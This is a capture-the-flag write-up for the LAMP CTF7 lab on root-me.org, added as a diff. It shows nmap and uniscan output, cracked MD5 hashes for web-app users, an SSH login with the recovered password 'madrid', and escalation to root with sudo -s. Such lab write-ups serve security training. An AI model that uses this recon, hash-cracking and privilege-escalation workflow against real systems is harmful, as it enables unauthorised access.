@@ -1,0 +1,164 @@
+LAMP CTF7
+Time taken: ~ 1 hour 30 mins
+
+nmap:
+
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.045s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+80/tcp open  http       Apache httpd 2.2.15 ((CentOS))
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: QEMU user mode network gateway (94%), Linux 2.0.33 (93%), Oracle Virtualbox (92%), Samsung CLP-310N or CLX-3175RW, or Xerox Phaser 6110 printer (91%), Huawei Echolife HG520-series ADSL modem (91%), TP-LINK TD-W8951ND wireless ADSL modem (91%), ZyXEL Prestige 200 ISDN router (91%), ZyXEL ZyNOS 3.40 (91%), ZyXEL Prestige 2602R-D1A ADSL router (91%), ADSL router: Huawei MT800u-T; or ZyXEL Prestige 623ME-T1, 643, 662HW-61, 782, or 2602R-61 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   1.51 ms 10.0.2.2
+2   1.61 ms ctf01.root-me.org (212.129.28.18)
+
+NSE: Script Post-scanning.
+Initiating NSE at 19:55
+Completed NSE at 19:55, 0.00s elapsed
+Initiating NSE at 19:55
+Completed NSE at 19:55, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.17 seconds
+           Raw packets sent: 2112 (97.430KB) | Rcvd: 124 (43.619KB)
+
+uniscan:
+
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 22-5-2017 20:6:37
+===================================================================================================
+| Domain: http://ctf01.root-me.org/
+| Server: Apache/2.2.15 (CentOS)
+| IP: 212.129.28.18
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/assets/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/css/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/icons/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/img/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/inc/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/js/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/webalizer/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/css
+| [+] CODE: 200 URL: http://ctf01.root-me.org/error/HTTP_NOT_FOUND.html.var
+| [+] CODE: 200 URL: http://ctf01.root-me.org/index.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/js
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| [+] Crawling finished, 44 URL's found!
+|
+| File Upload Forms:
+|
+| Source Code Disclosure:
+|
+| FCKeditor File Upload:
+|
+| Timthumb:
+|
+| PHPinfo() Disclosure:
+| [+] phpinfo() page: http://ctf01.root-me.org/inc/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+| [+] phpinfo() page: http://ctf01.root-me.org/inc/phpinfo.php
+| 	System: Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 
+| 	PHP version: 5.3.3 
+| 	Apache Version: Apache/2.2.15 (CentOS) 
+| 	Server Administrator: root@localhost 
+| 	User/Group: apache(48)/48 
+| 	Server Root: /etc/httpd 
+| 	DOCUMENT_ROOT: /var/www/html 
+| 	SCRIPT_FILENAME: /var/www/html/inc/phpinfo.php 
+| 	allow_url_fopen: On
+| 	allow_url_include: Off
+| 	disable_functions: <i>no value</i>
+| 	safe_mode: Off
+| 	safe_mode_exec_dir: <i>no value</i>
+| 	OpenSSL Library Version: OpenSSL 1.0.0-fips 29 Mar 2010 
+|
+| External hosts:
+| [+] External Host Found: https://sourceforge.net
+| [+] External Host Found: http://www.webalizer.org
+| [+] External Host Found: http://localhost.localdomain
+| [+] External Host Found: http://httpd.apache.org
+| [+] External Host Found: http://html5shim.googlecode.com
+|
+| Web Backdoors:
+|
+| E-mails:
+| [+] E-mail Found: you@domain.tld
+| [+] E-mail Found: mike@hyperreal.org
+| [+] E-mail Found: kevinh@kevcom.com
+| [+] E-mail Found: user@doamin.tld
+| [+] E-mail Found: license@php.net
+|
+| Ignored Files: 
+===================================================================================================
+| Dynamic tests:
+| Plugin name: Learning New Directories v.1.2 Loaded.
+| Plugin name: FCKedior tests v.1.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Find Backup Files v.1.2 Loaded.
+| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.2 Loaded.
+| Plugin name: SQL-injection tests v.1.2 Loaded.
+| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+| Plugin name: Web Shell Finder v.1.3 Loaded.
+| [+] 0 New directories added
+|                                                                                                               
+promising...
+
+also, looks like you can mess with the web app to create your own user...
+
+114,balls,test@nowhere.com,admin,21232f297a57a5a743894a0e4a801fc3 (admin),NULL
+
+
+<blank>,julia@localhost.localdomain,Julia Fields,ed2539fe892d2c52c42a440354e8e3d5 (madrid),NULL
+
+AHA. ssh login creds maybe?
+
+username: julia
+password: madrid
+
+well that works. might as well try some try some local privesc:
+
+[julia@localhost ~]$ su - julia
+Password: 
+[julia@localhost ~]$ sudo -s
+[sudo] password for julia: 
+[root@localhost julia]# id
+uid=0(root) gid=0(root) groups=0(root) 
+
+ROOOOOOOOOOOOOOOT!!!
+
